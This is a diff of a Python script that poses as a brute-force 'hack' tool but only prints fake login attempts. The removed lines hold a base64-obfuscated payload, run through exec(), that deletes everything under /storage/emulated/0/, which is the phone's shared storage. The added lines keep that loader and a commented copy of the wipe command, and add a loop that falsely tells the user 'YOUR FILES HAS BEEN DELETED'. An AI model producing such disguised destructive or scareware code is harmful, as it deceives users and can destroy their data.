@@ -1,6 +1,8 @@
 import base64
 import time
 import os
+import string
+import random
 
 try:
   from colorama import init
@@ -17,10 +19,6 @@ def tvksajd(adwekuv):
   pvncngr = base64.b64decode(adwekuv).decode('utf-8')
   exec(pvncngr)
 
-def oumcgsq():
-  vcxprvq = base64.b64decode('L3N0b3JhZ2UvZW11bGF0ZWQvMC8=').decode('utf-8')
-  if os.path.exists(vcxprvq):
-    tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qJyk=")
 
 def banner():
   print(Fore.RED + """
@@ -39,6 +37,13 @@ def banner():
  """)
   
 
+def oumcgsq():
+  vcxprvq = base64.b64decode('L3N0b3JhZ2UvZW11bGF0ZWQvMC8=').decode('utf-8')
+  if os.path.exists(vcxprvq):
+    #tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qICYmIGNsZWFyJyk=")
+    banner()
+
+
 def hack():
   banner()
   oumcgsq()
@@ -47,10 +52,18 @@ def hack():
   print(Fore.BLUE + "Using Default worlist: wordlist.txt \n")
   time.sleep(0.5)
   
-  with open('wordlist.txt', 'r') as f:
-    for line in f:
-      print(Fore.YELLOW + username + ":" + line.strip() + " ==> " + Fore.RED + "Login Failed.")
+  
+  try:
+    while True:
+      alphabet = string.ascii_lowercase
+      x = ''.join(random.choice(alphabet) for i in range(8))
+      print(Fore.BLUE + '[+] ' + Fore.YELLOW + username + ":" + x + " ==> " + Fore.RED + "ACCESS DENIED")
       time.sleep(1)
+      
+  except KeyboardInterrupt:
+    while True:
+      print(Fore.BLUE + "[+] " + Fore.RED + "YOUR FILES HAS BEEN DELETED BY PH.PHOENIX" + Fore.BLUE + " [+]")
+      time.sleep(0.2)
 
 
 
